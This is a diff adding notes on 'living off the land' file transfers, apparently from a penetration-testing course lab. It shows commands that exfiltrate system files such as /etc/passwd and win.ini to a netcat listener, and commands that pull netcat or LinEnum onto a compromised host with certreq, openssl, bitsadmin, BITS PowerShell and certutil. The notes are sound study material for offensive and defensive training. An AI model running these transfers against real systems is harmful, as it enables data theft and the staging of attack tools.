@@ -739,3 +739,56 @@ curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
 sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt
 ```
 By default, with Apache, if we hit a directory without an index file (index.html), it will list all the files. nginx hides list all files features. Nginx being minimal, features like that are not enabled by default.
+
+# Living off The Land
+The term LOLBins (Living off the Land binaries) came from a Twitter discussion on what to call binaries that 
+an attacker can use to perform actions beyond their original purpose. 
+
+## Using the LOLBAS and GTFOBins Project
+
+### LOLBAS
+To search for download and upload functions in LOLBAS we can use /download or /upload.
+Let's use CertReq.exe as an example.
+
+__Upload win.ini to our Pwnbox__ 
+```
+C:\htb> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
+````
+__File Received in our Netcat Session__
+```
+sudo nc -lvnp 8000
+```
+If you get an error when running certreq.exe, the version you are using may not contain the -Post parameter.
+
+### GTFOBins
+To search for the download and upload function in GTFOBins for Linux Binaries, we can use +file download or +file upload.
+Let's use OpenSSL. It's frequently installed and often included in other software distributions, with sysadmins using it to generate security certificates, among other tasks.
+
+__Create Certificate in our Pwnbox__
+```
+openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+```
+__Stand up the Server in our Pwnbox__ 
+```
+openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
+```
+__Download File from the Compromised Machine__
+```
+openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
+```
+### Other Common Living off the Land tools
+The Background Intelligent Transfer Service (BITS) can be used to download files from HTTP sites and SMB shares. It checks host and network utilization into account to minimize the impact on a user's foreground work.
+```
+bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
+```
+PowerShell also enables interaction with BITS enables file downloads and uploads, supports credentials, and can use specified proxy servers.
+```
+ Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
+ ```
+### Certutil
+Casey Smith (@subTee) found that Certutil can be used to download arbitrary files. It is available in all Windows versions and has been a popular file transfer technique, serving as a defacto wget for Windows. Antimalware Scan Interface (AMSI) currently detects if used in malicious way.
+
+__Download a File with Certutil__
+```
+certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
+```
